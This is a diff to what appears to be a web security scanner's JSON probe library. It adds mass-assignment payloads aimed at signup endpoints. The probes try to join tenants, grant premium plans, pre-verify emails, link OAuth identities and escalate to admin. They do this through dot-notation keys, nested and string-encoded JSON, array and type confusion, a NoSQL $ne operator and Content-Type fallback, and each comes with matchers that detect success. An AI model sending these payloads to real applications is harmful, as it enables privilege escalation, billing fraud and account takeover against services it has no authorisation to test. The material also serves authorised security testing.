@@ -403,6 +403,132 @@
           }
         }
       ]
+    },
+    "tenant_billing_state_oauth": {
+      "description": "Signup mass-assignment beyond admin flags: tenant, billing, workflow-state and OAuth-identity fields. Submit alongside legit fields; confirm by reading your profile/entitlements afterwards (accepted != bound).",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"org\":\"internal-team\",\"organization_id\":1,\"tenant_id\":1,\"is_premium\":true,\"subscription_id\":9999,\"plan\":\"enterprise\",\"trial_ends_at\":\"2050-01-01T00:00:00Z\",\"state\":\"active\",\"status\":\"active\",\"email_verified\":true,\"provider\":\"google\",\"provider_id\":\"100000000000000000001\"}",
+          "description": "Tenant-join / free-Pro-upgrade / workflow-state-jump / email-pre-verify / OAuth-identity-link via mass assignment. Verify each stuck via a follow-up authenticated read.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unknown field",
+                "unexpected",
+                "not allowed",
+                "invalid field",
+                "rejected",
+                "forbidden",
+                "validation error"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
+    "key_shape_confusion": {
+      "description": "Mass-assignment via key SHAPE, not just name — dot-notation, arrays, string-encoded JSON, type confusion, and Content-Type parser fallback reach binders a flat allowlist misses.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"account.role\":\"admin\",\"account\":{\"meta\":{\"role\":\"admin\"}},\"profile\":\"{\\\"isAdmin\\\":true}\"}",
+          "description": "Dot-notation flattening + deep nesting + string-encoded-JSON field — mismatched flatten/parse can overwrite internal fields.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unknown field",
+                "unexpected",
+                "not allowed",
+                "invalid field",
+                "rejected",
+                "forbidden",
+                "validation error"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{\"roles\":[\"user\",\"admin\"],\"admin\":\"false\",\"isAdmin\":0,\"verified\":null,\"isAdmin_ne\":{\"$ne\":null}}",
+          "description": "Array privilege (first/last-element binding), string/num/null type confusion ('false'/0/null may coerce truthy), and NoSQL operator ($ne) in a signup body. NoSQL operators AUTHORIZED envs only.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unknown field",
+                "unexpected",
+                "not allowed",
+                "invalid field",
+                "rejected",
+                "forbidden",
+                "validation error"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{\"isAdmin\":true}   # resend with Content-Type: text/plain / application/x-www-form-urlencoded / */* / application/json;charset=garbage",
+          "description": "Content-Type parser-fallback: the same admin payload under a non-JSON or malformed Content-Type may hit a weaker validator that still parses JSON. Also try NO Content-Type header.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unknown field",
+                "unexpected",
+                "not allowed",
+                "invalid field",
+                "rejected",
+                "forbidden",
+                "validation error"
+              ]
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {}
+        }
+      ]
     }
   }
 }
